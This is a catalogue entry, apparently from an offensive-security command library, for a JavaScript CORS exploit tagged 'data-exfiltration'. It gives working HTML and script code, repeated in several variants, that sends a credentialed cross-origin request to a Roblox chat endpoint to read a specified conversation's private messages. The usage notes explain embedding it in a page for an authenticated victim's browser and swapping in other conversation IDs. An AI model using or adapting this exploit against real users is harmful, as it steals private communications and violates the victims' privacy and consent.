---
id: cmd-js-cors-chat-reader
name: js-cors-chat-reader
type: command
executor: javascript
data: >-
  <h2>CORS To Read Chat</h2><div id="demo"><button type="button"
  onclick="cors()">Chat Reader @ Roblox</button></div><script>function
  cors(){var xhttp = new XMLHttpRequest();
  xhttp.onreadystatechange=function(){if(this.readyState == 4 && this.status ==
  200){ document.getElementById("demo").innerHTML =
  document.write(this.responseText);}};
  xhttp.open("GET","https://chat.roblox.com/v2/get-messages?conversationId=469104576&pageSize=3",true);
  xhttp.withCredentials = true; xhttp.send();}</script>
output: Chat messages from the specified conversation displayed in the HTML document
created_at: '2024-10-01T00:00:00Z'
updated_at: '2025-12-14T17:32:01.298Z'
platforms:
  - Web
tags:
  - cors-exploit
  - javascript
  - data-exfiltration
verified: false
validated: true
submitted: true
---

# js-cors-chat-reader

## Command

```javascript
<h2>CORS To Read Chat</h2><div id="demo"><button type="button" onclick="cors()">Chat Reader @ Roblox</button></div><script>function cors(){var xhttp = new XMLHttpRequest(); xhttp.onreadystatechange=function(){if(this.readyState == 4 && this.status == 200){ document.getElementById("demo").innerHTML = document.write(this.responseText);}}; xhttp.open("GET","https://chat.roblox.com/v2/get-messages?conversationId=469104576&pageSize=3",true); xhttp.withCredentials = true; xhttp.send();}</script>
```

## Description

This JavaScript embedded in HTML performs a cross-origin XMLHttpRequest to the Roblox chat API, fetching private messages using credentials, exploiting a whitelisted origin to bypass CORS restrictions and display sensitive data.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| conversationId | Specific chat ID to query (e.g., 469104576) | Yes |
| pageSize | Number of messages to fetch (e.g., 3) | Yes |
| withCredentials | Boolean to include cookies in the request (true) | Yes |

## Examples

### Basic Usage

```javascript
function cors(){var xhttp = new XMLHttpRequest(); xhttp.onreadystatechange=function(){if(this.readyState == 4 && this.status == 200){ document.write(this.responseText);}}; xhttp.open("GET","https://chat.roblox.com/v2/get-messages?conversationId=469104576&pageSize=3",true); xhttp.withCredentials = true; xhttp.send();}
cors();
```

Embed in a page and execute in an authenticated browser.

### Advanced Usage

Modify for different chats:

```javascript
xhttp.open("GET","https://chat.roblox.com/v2/get-messages?conversationId=NEW_ID&pageSize=10",true);
```

## Expected Output

JSON like {"messages":[{"body":"Hello","sender":"user1"}]} written to the document, revealing private chat content.

## Related

- [[Related Procedure: Exploit-CORS-to-Read-Private-Chats]]
